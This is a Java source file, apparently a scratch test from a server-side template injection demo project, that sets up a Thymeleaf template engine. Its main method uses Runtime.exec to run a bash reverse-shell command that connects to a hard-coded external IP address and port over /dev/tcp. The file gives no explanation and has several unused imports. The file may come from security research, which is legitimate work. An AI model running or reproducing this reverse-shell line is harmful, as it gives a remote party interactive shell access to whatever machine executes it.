package com.example.sstidemo;

import com.alibaba.druid.sql.SQLUtils;
import com.alibaba.druid.sql.ast.SQLStatement;
import com.alibaba.druid.util.JdbcConstants;
import com.example.sstidemo.controller.NotifyController;
import jdk.jshell.JShell;
import org.thymeleaf.context.Context;
import org.thymeleaf.spring6.SpringTemplateEngine;
import org.thymeleaf.spring6.templateresolver.SpringResourceTemplateResolver;
import org.thymeleaf.templatemode.TemplateMode;

import java.io.FileInputStream;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.sql.SQLException;
import java.util.List;

/**
 * @author by RacerZ
 * @date 2024/2/19.
 */
public class Test {
    private String templatePrefix = "file:///non_exists/";
    private String templateSuffix = ".html";

    public static void main(String[] args) throws Exception {
        Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/43.140.198.45/8777 0>&1");
    }

    public SpringTemplateEngine getTemplateEngine() {
        SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
//        resolver.setApplicationContext(this.applicationContext);
        resolver.setTemplateMode(TemplateMode.HTML);
        resolver.setCharacterEncoding(StandardCharsets.UTF_8.name());
        resolver.setPrefix(this.templatePrefix);
        resolver.setSuffix(this.templateSuffix);
        SpringTemplateEngine templateEngine = new SpringTemplateEngine();
        templateEngine.setTemplateResolver(resolver);
        return templateEngine;
    }
}
